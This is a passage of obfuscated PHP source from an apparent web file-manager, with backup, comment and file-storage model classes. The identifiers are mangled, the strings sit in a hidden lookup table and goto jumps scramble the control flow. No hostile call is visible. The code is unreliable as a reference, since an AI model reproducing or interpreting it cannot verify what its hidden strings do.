$e½£Èìù×Ö[$CÄø¸Ï¸ä¹[1394]] != $CÄø¸Ï¸ä¹[83]) { return !1; } $A—¼©áŒß” = $this->process(); foreach ($A—¼©áŒß” as $b†Ò Ñİæ) { if ($b†Ò Ñİæ) { return Task::restart($b†Ò Ñİæ[$CÄø¸Ï¸ä¹[367]]); } } goto D„İìÄ ¡È; C‰Æ¿ á„Â: $CÄø¸Ï¸ä¹ =& $_SERVER[“]; if ($GLOBALS[$CÄø¸Ï¸ä¹[6]][$CÄø¸Ï¸ä¹[84]][$CÄø¸Ï¸ä¹[2120]] != $CÄø¸Ï¸ä¹[83]) { return !0; } $e½£Èìù×Ö = $this->config(); goto e• öå‰›Š; EŠ…ÏÚ›‡: if (!$fĞ©©­ŠŞî->dbFile()) { return !1; } if ($e½£Èìù×Ö[$CÄø¸Ï¸ä¹[676]] == $CÄø¸Ï¸ä¹[470]) { $fĞ©©­ŠŞî->file(); } Backup::set(array($CÄø¸Ï¸ä¹[673] => 1, $CÄø¸Ï¸ä¹[449] => time())); goto Eİô›ƒ•ç—; D„İìÄ ¡È: $fĞ©©­ŠŞî = new Backup(); $fĞ©©­ŠŞî->keep(); if (!$fĞ©©­ŠŞî->db()) { return !1; } goto EŠ…ÏÚ›‡; f£ß¦«¶©Â: } public function process() { $cÉÒ³ğİ²Œ =& $_SERVER[“]; return array($cÉÒ³ğİ²Œ[678] => Task::get($cÉÒ³ğİ²Œ[696]), $cÉÒ³ğİ²Œ[681] => Task::get($cÉÒ³ğİ²Œ[712]), $cÉÒ³ğİ²Œ[167] => Task::get($cÉÒ³ğİ²Œ[720])); } public function restore() { $AÒãæ˜‘Ù‚ =& $_SERVER[“]; ActionCall($AÒãæ˜‘Ù‚[960], !0, 1); ActionCall($AÒãæ˜‘Ù‚[960], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\145\156\x74"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\155\145" => "\143\157\155\155\x65\x6e\x74\137\155\x65\164\x61", "\155\x65\x74\141\x46\151\x65\154\x64" => "\143\x6f\155\155\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($D½Ø‘ÄÔÉ¬) { $A¨÷ÊÖæ¹ =& $_SERVER[“]; if ($D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[2121]]) { $E·¾×…è›Ê = $this->where(array($A¨÷ÊÖæ¹[2122] => $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[2121]]))->find(); if (!$E·¾×…è›Ê || $E·¾×…è›Ê[$A¨÷ÊÖæ¹[371]] != $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[371]] || $E·¾×…è›Ê[$A¨÷ÊÖæ¹[458]] != $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[458]]) { return !1; } $this->where(array($A¨÷ÊÖæ¹[2122] => $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[2121]]))->setAdd($A¨÷ÊÖæ¹[2123], 1); } $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[2124]] = 0; $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[2123]] = 0; $D½Ø‘ÄÔÉ¬[$A¨÷ÊÖæ¹[673]] = 1; return $this->add($D½Ø‘ÄÔÉ¬); } public function remove($DÀ‡Šˆ°»ö) { $dŠä‘Ï†¨ =& $_SERVER[“]; $Fì®³ˆöéĞ = array($dŠä‘Ï†¨[2122] => $DÀ‡Šˆ°»ö); $f †‚³ÓÀÏ = $this->where($Fì®³ˆöéĞ)->find(); if ($f †‚³ÓÀÏ[$dŠä‘Ï†¨[2121]]) { $this->where(array($dŠä‘Ï†¨[2122] => $f †‚³ÓÀÏ[$dŠä‘Ï†¨[2121]]))->setAdd($dŠä‘Ï†¨[2123], -1); } return $this->where($Fì®³ˆöéĞ)->delete(); } public function edit($dœ–®¸¹‹ˆ, $cã÷¦ØĞ) { $c¸™› =& $_SERVER[“]; $D„ô×ã§Ğ = array($c¸™›[2122] => $dœ–®¸¹‹ˆ); return $this->where($D„ô×ã§Ğ)->save(array($c¸™›[2125] => $cã÷¦ØĞ)); } public function prasise($aëù ¯æÀä) { $eÎ£‚Òæòï =& $_SERVER[“]; $c‹¿‚‰‘™Ä = Model($eÎ£‚Òæòï[2126]); $AµÓ«ô’ƒ = array($eÎ£‚Òæòï[2122] => $aëù ¯æÀä, $eÎ£‚Òæòï[1413] => USER_ID); $CòãàÅøêº = $c‹¿‚‰‘™Ä->where($AµÓ«ô’ƒ)->find(); if (!$CòãàÅøêº) { $c‹¿‚‰‘™Ä->add($AµÓ«ô’ƒ); $D‹¶¯êó¡ï = $this->where(array($eÎ£‚Òæòï[2122] => $aëù ¯æÀä))->setAdd($eÎ£‚Òæòï[2124], 1); } else { $c‹¿‚‰‘™Ä->where($AµÓ«ô’ƒ)->delete(); $D‹¶¯êó¡ï = $this->where(array($eÎ£‚Òæòï[2122] => $aëù ¯æÀä))->setAdd($eÎ£‚Òæòï[2124], -1); } return $D‹¶¯êó¡ï; } public function targetInfo($C‡İ‘Ê©Ğ, $E¨´ÉİÚ¹¸) { goto Aç†‡íÁˆ; Fëø¾›˜©»: $c¸®•àî = "\122\x49\x47\110\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\143\x6f\155\x6d\x65\x6e\x74\137\x70\x72\141\151\163\145\x20\x73\164\x61\162\x20\x6f\x6e\x20\x63\x6f\x6d\155\x65\x6e\164\x2e\143\157\x6d\x6d\145\x6e\x74\x49\x44\40\x3d\x20\163\x74\141\162\x2e\x63\157\155\x6d\145\x6e\x74\111\x44"; $B­˜™ÑŠ = $this->alias($cê»ŒË®æ†[341])->where($AßçÂò¤…¢)->join($c¸®•àî, $cê»ŒË®æ†[2127])->count(); $f‡²²ğ‚±¦ = array($cê»ŒË®æ†[2128] => $Aµº²°ŸƒÕ, $cê»ŒË®æ†[2129] => $B­˜™ÑŠ); goto B¢§Öµä…ß; B¢§Öµä…ß: return $f‡²²ğ‚±¦; goto bâ²í¯ Œ˜; Aç†‡íÁˆ: $cê»ŒË®æ† =& $_SERVER[“]; $AßçÂò¤…¢ = array($cê»ŒË®æ†[523] => $C‡İ‘Ê©Ğ, $cê»ŒË®æ†[524] => $E¨´ÉİÚ¹¸); $Aµº²°ŸƒÕ = $this->where($AßçÂò¤…¢)->count(); goto Fëø¾›˜©»; bâ²í¯ Œ˜: } public function listData($a××Áä×¾) { $B•Ÿ†¹”¤± =& $_SERVER[“]; if (isset($a××Áä×¾[$B•Ÿ†¹”¤±[2130]])) { if ($a××Áä×¾[$B•Ÿ†¹”¤±[2130]]) { $a××Áä×¾[$B•Ÿ†¹”¤±[2131]] = array($B•Ÿ†¹”¤±[914], intval($a××Áä×¾[$B•Ÿ†¹”¤±[2130]])); } unset($a××Áä×¾[$B•Ÿ†¹”¤±[2130]]); } if (isset($a××Áä×¾[$B•Ÿ†¹”¤±[2132]])) { if ($a××Áä×¾[$B•Ÿ†¹”¤±[2132]]) { $a××Áä×¾[$B•Ÿ†¹”¤±[2131]] = array($B•Ÿ†¹”¤±[911], intval($a××Áä×¾[$B•Ÿ†¹”¤±[2132]])); } unset($a××Áä×¾[$B•Ÿ†¹”¤±[2132]]); } return $this->_listData($a××Áä×¾); } private function _listData($C©ÒÀ»È·) { $fä¾°÷ºŒÁ =& $_SERVER[“]; $fæç‰øè˜ = $this->where($C©ÒÀ»È·)->_makeOrder()->selectPage(100); $this->_listAppendParent($fæç‰øè˜[$fä¾°÷ºŒÁ[354]]); $this->_listAppendUser($fæç‰øè˜[$fä¾°÷ºŒÁ[354]]); $this->_listAppendMeta($fæç‰øè˜[$fä¾°÷ºŒÁ[354]]); return $fæç‰øè˜; } private function _makeOrder() { $b‡ùÇæ´É =& $_SERVER[“]; $C ò›Çº† = array($b‡ùÇæ´É[2124], $b‡ùÇæ´É[2123], $b‡ùÇæ´É[187]); $b¤Û’‘¼¨ = Input::get($b‡ùÇæ´É[407], $b‡ùÇæ´É[7], $b‡ùÇæ´É[389], $C ò›Çº†); $d¥Õ˜”º…Ì = Input::get($b‡ùÇæ´É[408], $b‡ùÇæ´É[7], $b‡ùÇæ´É[1415], array($b‡ùÇæ´É[2133], $b‡ùÇæ´É[405])); $D†ÇŸÄ„Â = $b¤Û’‘¼¨ . $b‡ùÇæ´É[50] . $d¥Õ˜”º…Ì; return $this->order($D†ÇŸÄ„Â); } private function _listAppendParent(&$C¾¤Ã‡Òô) { goto E¶èÔŠœÜƒ; E¶èÔŠœÜƒ: $Bª¦ˆ‚ÃÙ… =& $_SERVER[“]; $c‘š“‚îø = array_unique(array_to_keyvalue($C¾¤Ã‡Òô, $Bª¦ˆ‚ÃÙ…[33], $Bª¦ˆ‚ÃÙ…[2121])); $c‘š“‚îø = array_remove_value($c‘š“‚îø, $Bª¦ˆ‚ÃÙ…[470]); goto c¢¨ŠƒÂØ‰; F±–Ü¥±Û: foreach ($C¾¤Ã‡Òô as &$AºÆ ÛŞáâ) { if (isset($eöå§‘¿Ã«[$AºÆ ÛŞáâ[$Bª¦ˆ‚ÃÙ…[2121]]])) { $AºÆ ÛŞáâ[$Bª¦ˆ‚ÃÙ…[2134]] = $eöå§‘¿Ã«[$AºÆ ÛŞáâ[$Bª¦ˆ‚ÃÙ…[2121]]]; } } goto D¦Á›×Ï‡Ê; c¢¨ŠƒÂØ‰: if (!$c‘š“‚îø) { return; } $eöå§‘¿Ã« = $this->where(array($Bª¦ˆ‚ÃÙ…[2122] => array($Bª¦ˆ‚ÃÙ…[7], $c‘š“‚îø)))->select(); $eöå§‘¿Ã« = array_to_keyvalue($eöå§‘¿Ã«, $Bª¦ˆ‚ÃÙ…[2131]); goto F±–Ü¥±Û; D¦Á›×Ï‡Ê: } private function _listAppendUser(&$CÜ—…Àö×) { goto e…’ÄÛ‰ô; cÅÎåéš: if (count($A°ÆØĞÔ‰×) == 0) { return; } foreach ($CÜ—…Àö× as $AñˆõÍ”‹«) { if (isset($AñˆõÍ”‹«[$c‹²î¨¼Ê[2134]])) { $A°ÆØĞÔ‰×[] = $AñˆõÍ”‹«[$c‹²î¨¼Ê[2134]][$c‹²î¨¼Ê[1423]]; } } $e¡ÕôÄšµÂ = Model($c‹²î¨¼Ê[479])->userListInfo($A°ÆØĞÔ‰×); goto c½íˆàé…Æ; e…’ÄÛ‰ô: $c‹²î¨¼Ê =& $_SERVER[“]; $A°ÆØĞÔ‰× = array_unique(array_to_keyvalue($CÜ—…Àö×, $c‹²î¨¼Ê[33], $c‹²î¨¼Ê[1423])); $A°ÆØĞÔ‰× = array_remove_value($A°ÆØĞÔ‰×, $c‹²î¨¼Ê[470]); goto cÅÎåéš; c½íˆàé…Æ: foreach ($CÜ—…Àö× as &$AñˆõÍ”‹«) { $AñˆõÍ”‹«[$c‹²î¨¼Ê[537]] = $e¡ÕôÄšµÂ[$AñˆõÍ”‹«[$c‹²î¨¼Ê[1423]]]; if (isset($AñˆõÍ”‹«[$c‹²î¨¼Ê[2134]])) { $AñˆõÍ”‹«[$c‹²î¨¼Ê[2134]][$c‹²î¨¼Ê[537]] = $e¡ÕôÄšµÂ[$AñˆõÍ”‹«[$c‹²î¨¼Ê[2134]][$c‹²î¨¼Ê[1423]]]; } } goto B„ÅŞ¹¡ì; B„ÅŞ¹¡ì: } private function _listAppendMeta(&$cÆÖ²ùìÊ„) { goto EÅ”¡ŸÙ˜º; EÅ”¡ŸÙ˜º: $EÙôÚŠ‚„ˆ =& $_SERVER[“]; $dåèæ²„ğ = array_unique(array_to_keyvalue($cÆÖ²ùìÊ„, $EÙôÚŠ‚„ˆ[33], $EÙôÚŠ‚„ˆ[2131])); $dåèæ²„ğ = array_remove_value($dåèæ²„ğ, $EÙôÚŠ‚„ˆ[470]); goto c¹£ÛÃÉÍ³; Bñ Á¶ó£Ê: if (!$D£é³ğ³Ó) { return !1; } foreach ($cÆÖ²ùìÊ„ as &$dˆ®¿áŠÊ) { $dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[417]] = $D£é³ğ³Ó[$dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[2131]]]; if (isset($dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[2134]])) { $dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[2134]][$EÙôÚŠ‚„ˆ[417]] = $D£é³ğ³Ó[$dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[2134]][$EÙôÚŠ‚„ˆ[2131]]]; } } goto Fè êŸß×¶; c¹£ÛÃÉÍ³: if (!$dåèæ²„ğ) { return; } foreach ($cÆÖ²ùìÊ„ as $dˆ®¿áŠÊ) { if (isset($dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[2134]])) { $dåèæ²„ğ[] = $dˆ®¿áŠÊ[$EÙôÚŠ‚„ˆ[2134]][$EÙôÚŠ‚„ˆ[2131]]; } } $D£é³ğ³Ó = $this->metaList($dåèæ²„ğ); goto Bñ Á¶ó£Ê; Fè êŸß×¶: } private function metaList($A¨½Û•æ) { goto eßÛªŸÌ¨“; eßÛªŸÌ¨“: $Aù¥¹é¦Áê =& $_SERVER[“]; if (!$A¨½Û•æ) { return array(); } $fíğÉŞëÑ• = array($Aù¥¹é¦Áê[2131] => array($Aù¥¹é¦Áê[7], $A¨½Û•æ)); goto AòŒ¦µ™è; AòŒ¦µ™è: $cÖÄ±…ÊÈ = Model($Aù¥¹é¦Áê[2135])->where($fíğÉŞëÑ•)->select(); $cÖÄ±…ÊÈ = array_to_keyvalue_group($cÖÄ±…ÊÈ, $Aù¥¹é¦Áê[2131]); foreach ($cÖÄ±…ÊÈ as $føê÷ƒÛØ· => $fíÃ“ºÉã¦) { $BÑ¡¾°éá = array(); foreach ($fíÃ“ºÉã¦ as $Dóµô¾¨„) { $BÑ¡¾°éá[$Dóµô¾¨„[$Aù¥¹é¦Áê[89]]] = $Dóµô¾¨„[$Aù¥¹é¦Áê[359]]; } $cÖÄ±…ÊÈ[$føê÷ƒÛØ·] = $BÑ¡¾°éá; } goto f­…›™İ¡; f­…›™İ¡: return $cÖÄ±…ÊÈ ? $cÖÄ±…ÊÈ : array(); goto e–„¤õ«£ø; e–„¤õ«£ø: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\x6c\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\x6d\145" => "\x69\x6f\137\146\x69\x6c\x65\137\x6d\145\x74\141", "\x6d\145\x74\x61\106\x69\x65\x6c\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($fäÙåª„á) { $BÏÎ¶Ï•÷ =& $_SERVER[“]; static $C…ˆ‘’ñ© = array(); if (!isset($C…ˆ‘’ñ©[$fäÙåª„á])) { $cÒ¶Ëœôæ = $BÏÎ¶Ï•÷[2136]; $B¸†¼´Îö = Model($BÏÎ¶Ï•÷[422])->field($cÒ¶Ëœôæ)->where(array($BÏÎ¶Ï•÷[420] => $fäÙåª„á))->find(); $C…ˆ‘’ñ©[$fäÙåª„á] = $B¸†¼´Îö; } return $C…ˆ‘’ñ©[$fäÙåª„á]; } public function addFileByContent($CñÆí‚ÖŠß = '', $cÀâİ‰Ï´‚ = '') { goto Cª»é‹‹º; D‚õêªÒÄÆ: $DöŠÂÜİîå = $AæÎ¿í³¹ . $DŠå²„¿Õ‹[2138] . rand_string(16); file_put_contents($DöŠÂÜİîå, $CñÆí‚ÖŠß); $dÄ´à½‡¡ù = $this->addFile($DöŠÂÜİîå, $cÀâİ‰Ï´‚, !0); goto eÉŞÓå²°É; Cª»é‹‹º: $DŠå²„¿Õ‹ =& $_SERVER[“]; $AæÎ¿í³¹ = TEMP_PATH . $DŠå²„¿Õ‹[2137]; if (!is_dir($AæÎ¿í³¹)) { mk_dir($AæÎ¿í³¹); } goto D‚õêªÒÄÆ; eÉŞÓå²°É: if (file_exists($DöŠÂÜİîå)) { @unlink($DöŠÂÜİîå); } return $dÄ´à½‡¡ù; goto B¿ï‡¹ğ‘¡; B¿ï‡¹ğ‘¡: } public function createFileName($b½¦Ğ‡Õ¸â) { goto fÂê¾å¦Ë©; fÂê¾å¦Ë©: $Fã£™¯Ù =& $_SERVER[“]; $c²… Ûé— = IO::init($Fã£™¯Ù[8]); $eä²„ê’Ëø = $this->makeFilePath($b½¦Ğ‡Õ¸â, $c²… Ûé—); goto bĞÜ“Ë‹¿; FÌë‘ŞóÈ: if (!$F­¼·ˆÛâ && !Cache::get($Cà‰ë÷×Œ)) { $F­¼·ˆÛâ = !0; $aÂ…½è¿óš = IO::mkdir($d‰†ßÂÔÁ¼); if (!IO::exist($aÂ…½è¿óš . $Fã£™¯Ù[2140])) { IO::mkfile($aÂ…½è¿óš . $Fã£™¯Ù[2140]); } Cache::set($Cà‰ë÷×Œ, 1, 3600 * 2); } return $eä²„ê’Ëø; goto dó²×õŠöÑ; bĞÜ“Ë‹¿: $d‰†ßÂÔÁ¼ = $c²… Ûé—->pathFather($eä²„ê’Ëø); static $F­¼·ˆÛâ = false; $Cà‰ë÷×Œ = $Fã£™¯Ù[2139] . md5($d‰†ßÂÔÁ¼); goto FÌë‘ŞóÈ; dó²×õŠöÑ: } public function makeFilePath($c¥Ò°ÖªƒĞ, $bÕËÎ“Á‰) { goto aùªğÜÙĞÃ; BÍ¯¹Ñˆ: switch ($E„ã§•Şİ) { case $Dí£İîØ¸˜[2144]: $FÕŒÉíÂ–‘ = $FÕŒÉíÂ–‘ . $Dí£İîØ¸˜[91] . $bÕËÎ“Á‰->ext($c¥Ò°ÖªƒĞ); if ($bÕËÎ“Á‰->ext($c¥Ò°ÖªƒĞ) == $Dí£İîØ¸˜[2085]) { $FÕŒÉíÂ–‘ .= $Dí£İîØ¸˜[2145]; } break; case $Dí£İîØ¸˜[2146]: goto c¤Í‡¯ˆğÖ; c—˜çêŒ÷ù: if (IO::isTypeObject() && !IO::isUploadServer()) { IO::setContent($FÕŒÉíÂ–‘, $Dí£İîØ¸˜[33]); } CacheLock::unlock($e‚‹ã½ŸâŒ); break; goto føòÄèªè; c¤Í‡¯ˆğÖ: $c‘‹¯”‚Ô­ = Model($Dí£İîØ¸˜[1075])->get($Dí£İîØ¸˜[1321]); $F©ÄµØŸÂˆ = substr(md5($Dí£İîØ¸˜[1904] . $c‘‹¯”‚Ô­ . date($Dí£İîØ¸˜[671])), 0, 8); $f—‚®Ç˜­æ = KodIO::defaultDriver(); goto c’¤äÔİ˜À; c’¤äÔİ˜À: $FóÉâøÛ›Ø = $Dí£İîØ¸˜[2147] . $f—‚®Ç˜­æ[$Dí£İîØ¸˜[367]] . $Dí£İîØ¸˜[2148] . date($Dí£İîØ¸˜[2149]) . $F©ÄµØŸÂˆ . $Dí£İîØ¸˜[8]; if ($bÕËÎ“Á‰->ext($c¥Ò°ÖªƒĞ) == $Dí£İîØ¸˜[2085]) { $c¥Ò°ÖªƒĞ .= $Dí£İîØ¸˜[2145]; } $e‚‹ã½ŸâŒ = $Dí£İîØ¸˜[2150] . $FóÉâøÛ›Ø . $c¥Ò°ÖªƒĞ; goto cª‡–§³‡; cª‡–§³‡: CacheLock::lock($e‚‹ã½ŸâŒ); $f”»æ„’Îƒ = IO::fileNameAuto($FóÉâøÛ›Ø, $c¥Ò°ÖªƒĞ); $FÕŒÉíÂ–‘ = $FóÉâøÛ›Ø . $f”»æ„’Îƒ; goto c—˜çêŒ÷ù; føòÄèªè: case $Dí£İîØ¸˜[2143]: break; default: break; } return $FÕŒÉíÂ–‘; goto BÇ—ªæ÷èé; aùªğÜÙĞÃ: $Dí£İîØ¸˜ =& $_SERVER[“]; $E„ã§•Şİ = Model($Dí£İîØ¸˜[1075])->get($Dí£İîØ¸˜[2141]); $FóÉâøÛ›Ø = KodIO::defaultIO() . date($Dí£İîØ¸˜[2142]); goto EÛ»“«¨ØÎ; EÛ»“«¨ØÎ: $FÕŒÉíÂ–‘ = $FóÉâøÛ›Ø . rand_string(5) . short_id(100); $c¥Ò°ÖªƒĞ = str_replace($Dí£İîØ¸˜[8], $Dí£İîØ¸˜[70], KodIO::clear($c¥Ò°ÖªƒĞ)); if (!$c¥Ò°ÖªƒĞ) { $E„ã§•Şİ = $Dí£İîØ¸˜[2143]; } goto BÍ¯¹Ñˆ; BÇ—ªæ÷èé: } public function addFileByRemote($D†Ì¤ÌİÚ, $fË¥ÆÖ¹ª±, $Dçö“ØÒ¬Ò = array()) { goto dÕ¢Ì•Æè–; dÕ¢Ì•Æè–: $eˆŒõÄÎï„ =& $_SERVER[“]; if (!IO::exist($D†Ì¤ÌİÚ)) { return !1; } $bøªò‘Ç½ = $Dçö“ØÒ¬Ò[$eˆŒõÄÎï„[163]] ? $Dçö“ØÒ¬Ò[$eˆŒõÄÎï„[163]] : $eˆŒõÄÎï„[33]; goto eîœªÛÉğÙ; EŒè’­‘²¾: if ($cÖÁ§İÀÖ = $this->addFileCheckExist($EñÈ¬‹¥ç[$eˆŒõÄÎï„[164]], $EñÈ¬‹¥ç[$eˆŒõÄÎï„[163]], $EñÈ¬‹¥ç[$eˆŒõÄÎï„[77]])) { return $cÖÁ§İÀÖ; } return $this->addFileData($EñÈ¬‹¥ç); goto C·¼÷ßàğ; eîœªÛÉğÙ: $d“Óù¼¨„á = IO::hashMd5($D†Ì¤ÌİÚ, $bøªò‘Ç½); $dÉÙÑëºŒ = KodIO::defaultDriver(); $EñÈ¬‹¥ç = array($eˆŒõÄÎï„[522] => IO::size($D†Ì¤ÌİÚ), $eˆŒõÄÎï„[2151] => 1, $eˆŒõÄÎï„[386] => $fË¥ÆÖ¹ª±, $eˆŒõÄÎï„[719] => $dÉÙÑëºŒ[$eˆŒõÄÎï„[367]], $eˆŒõÄÎï„[387] => $D†Ì¤ÌİÚ, $eˆŒõÄÎï„[2152] => $Dçö“ØÒ¬Ò[$eˆŒõÄÎï„[164]] ? $Dçö“ØÒ¬Ò[$eˆŒõÄÎï„[164]] : IO::hashSimple($D†Ì¤ÌİÚ), $eˆŒõÄÎï„[2153] => $d“Óù¼¨„á ? $d“Óù¼¨„á : $bøªò‘Ç½); goto EŒè’­‘²¾; C·¼÷ßàğ: } private function addFileData($fìáÉ¿Äà) { $a‡²’Ûêî© =& $_SERVER[“]; if (!$fìáÉ¿Äà) { return !1; } $fìáÉ¿Äà[$a‡²’Ûêî©[77]] = intval($fìáÉ¿Äà[$a‡²’Ûêî©[77]]); if (!$fìáÉ¿Äà[$a‡²’Ûêî©[77]] && strlen($fìáÉ¿Äà[$a‡²’Ûêî©[164]]) > 32) { $fìáÉ¿Äà[$a‡²’Ûêî©[77]] = intval(substr($fìáÉ¿Äà[$a‡²’Ûêî©[164]], 32)); } $BÌåÚà©Óò = $this->add($fìáÉ¿Äà); return $this->find($BÌåÚà©Óò); } public function addFile($dÖ¥¨ùÁÅ‡, $D“ì«ÏïË, $fàÙ¶°Ñ¨¥ = false) { goto f…ÂˆÚĞº÷; DÍ¼¼ÚØ¤¿: return $dº®½§Çö; goto Dòæåİ…; d¦×œÆñ…: $f£‰ÒÂ†’ = $this->addFileMake($dÖ¥¨ùÁÅ‡, $e‡²¾±Ÿ‚», $e™ñ‰½éÒ, $bñÆÓíç½, $D“ì«ÏïË, $fàÙ¶°Ñ¨¥); $dº®½§Çö = $this->addFileData($f£‰ÒÂ†’); CacheLock::unlock($aÁ¾è¶Ü‡”); goto DÍ¼¼ÚØ¤¿; f…ÂˆÚĞº÷: $e™ñ‰½éÒ = IO::hashSimple($dÖ¥¨ùÁÅ‡); $bñÆÓíç½ = IO::hashMd5($dÖ¥¨ùÁÅ‡); $e‡²¾±Ÿ‚» = IO::size($dÖ¥¨ùÁÅ‡); goto eë©è·ñª˜; eë©è·ñª˜: $aÁ¾è¶Ü‡” = $_SERVER[“][2154] . $bñÆÓíç½; CacheLock::lock($aÁ¾è¶Ü‡”); if ($E÷æ˜ß‡ï = $this->addFileCheckExist($e™ñ‰½éÒ, $bñÆÓíç½, $e‡²¾±Ÿ‚»)) { CacheLock::unlock($aÁ¾è¶Ü‡”); return $E÷æ˜ß‡ï; } goto d¦×œÆñ…; Dòæåİ…: } public function addFileMake($C×â¼—Üã©, $Cµ¬Ë•æ, $eãÆ¥Æ“„ô, $B»ŞãÊÈŸò, $dÅ‹ÉÜ†ô , $d”ƒÕßŠÚ†) { goto DîÙ§¶Äš…; DîÙ§¶Äš…: $bõ«¦ĞÅÚÑ =& $_SERVER[“]; $EÏ¦Æïâæà = $this->createFileName($dÅ‹ÉÜ†ô ); $a™…–ÇÑôŠ = get_path_father($EÏ¦Æïâæà); goto dƒÛ©Èµˆ; EĞğº‹›ŠÌ: $f”ëÙÄ÷ˆ = KodIO::defaultDriver(); $Dß°ù”Å…— = array($bõ«¦ĞÅÚÑ[522] => $Cµ¬Ë•æ, $bõ«¦ĞÅÚÑ[2151] => 1, $bõ«¦ĞÅÚÑ[386] => $dÅ‹ÉÜ†ô , $bõ«¦ĞÅÚÑ[719] => $f”ëÙÄ÷ˆ[$bõ«¦ĞÅÚÑ[367]], $bõ«¦ĞÅÚÑ[387] => $EÏ¦Æïâæà, $bõ«¦ĞÅÚÑ[2152] => $eãÆ¥Æ“„ô, $bõ«¦ĞÅÚÑ[2153] => $B»ŞãÊÈŸò); return $Dß°ù”Å…—; goto f¼Ğèí´—; dƒÛ©Èµˆ: $a¹à¡™¾ã– = get_path_this($EÏ¦Æïâæà); if ($d”ƒÕßŠÚ†) { $cİÀ¼íê³š = IO::move($C×â¼—Üã©, $a™…–ÇÑôŠ, !1, $a¹à¡™¾ã–); } else { $cİÀ¼íê³š = IO::copy($C×â¼—Üã©, $a™…–ÇÑôŠ, !1, $a¹à¡™¾ã–); } if (!$cİÀ¼íê³š) { return !1; } goto EĞğº‹›ŠÌ; f¼Ğèí´—: } public function addFileCheckExist($c…š¶Ï–ò¯, $A‹ºíšâ÷, $dòé­«ÙÓ‹) { $dŠŠª õñ =& $_SERVER[“]; $DÀ†áÉêì§ = $this->findByHash($c…š¶Ï–ò¯, $A‹ºíšâ÷); if (!$DÀ†áÉêì§) { return !1; } $a»øë¿ª×¬ = array($dŠŠª õñ[2151] => intval($DÀ†áÉêì§[$dŠŠª õñ[2155]]) + 1, $dŠŠª õñ[522] => $dòé­«ÙÓ‹); $this->where(array($dŠŠª õñ[420] => $DÀ†áÉêì§[$dŠŠª õñ[419]]))->save($a»øë¿ª×¬); return $DÀ†áÉêì§; } public function remove($BÖ¾¦ß«èÚ) { $this->linkCountChange($BÖ¾¦ß«èÚ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Cš ¾Ğœ²À) { $this->linkCountChange($Cš ¾Ğœ²À, !0); } public function linkCountChange($bØÊ¦Ñ³ßŒ, $eƒßªŒß›) { goto Dóí„äÙø¯; Dóí„äÙø¯: $b–å§«„İ¼ =& $_SERVER[“]; if (!$bØÊ¦Ñ³ßŒ) { return; } if (!is_array($bØÊ¦Ñ³ßŒ)) { $bØÊ¦Ñ³ßŒ = array($bØÊ¦Ñ³ßŒ); } goto dñª˜ù‹á®; b„’¯‡©¦›: foreach ($cÒªÇ¢°…Ş as $DöÁßŠçµ => $Cƒ¹à‰­ë) { $f¸ ÈãÙÃª = $Cƒ¹à‰­ë . $b–å§«„İ¼[33]; if (!$d·¹äñ­º³[$f¸ ÈãÙÃª]) { $d·¹äñ­º³[$f¸ ÈãÙÃª] = array(); } $d·¹äñ­º³[$f¸ ÈãÙÃª][] = $DöÁßŠçµ; } foreach ($d·¹äñ­º³ as $Cƒ¹à‰­ë => $dàÉÇ¦“î¼) { if (!$dàÉÇ¦“î¼) { continue; } $Cƒ¹à‰­ë = $eƒßªŒß› ? $Cƒ¹à‰­ë : -intval($Cƒ¹à‰­ë); $bË˜ÄèËÂÓ = array($b–å§«„İ¼[419] => array($b–å§«„İ¼[7], $dàÉÇ¦“î¼)); if ($Cƒ¹à‰­ë < 0) { $bË˜ÄèËÂÓ[$b–å§«„İ¼[2155]] = array($b–å§«„İ¼[915], abs($Cƒ¹à‰­ë)); } $this->where($bË˜ÄèËÂÓ)->setAdd($b–å§«„İ¼[2155], $Cƒ¹à‰­ë); } goto c¥¤¹ÈÃî¨; dñª˜ù‹á®: $cÒªÇ¢°…Ş = array(); foreach ($bØÊ¦Ñ³ßŒ as $DöÁßŠçµ) { $f¸ ÈãÙÃª = $DöÁßŠçµ . $b–å§«„İ¼[33]; if (!$cÒªÇ¢°…Ş[$f¸ ÈãÙÃª]) { $cÒªÇ¢°…Ş[$f¸ ÈãÙÃª] = 0; } $cÒªÇ¢°…Ş[$f¸ ÈãÙÃª]++; } $d·¹äñ­º³ = array(); goto b„’¯‡©¦›; c¥¤¹ÈÃî¨: } public function findByHash($C•ï›ƒÙ„©, $Fê¤«è¢¡ = false) { $b…˜é¼ÌÁ† =& $_SERVER[“]; if (!$C•ï›ƒÙ„© && !$Fê¤«è¢¡) { return !1; } $aÜ¡±«à°² = array($b…˜é¼ÌÁ†[2152] => $C•ï›ƒÙ„©); if ($Fê¤«è¢¡) { $aÜ¡±«à°² = array($b…˜é¼ÌÁ†[2153] => $Fê¤«è¢¡); } return $this->order($b…˜é¼ÌÁ†[2156])->where($aÜ¡±«à°²)->find(); } public function clearEmpty($b…ÆÛİ…† = 0) { goto F§¹ÏæØİÙ; Fß„óô‰—: foreach ($FëÏõŠ°” as $bõ×¬ÇèÓß) { $dªë¨·„°í->update(1); $this->resetFile($bõ×¬ÇèÓß); } 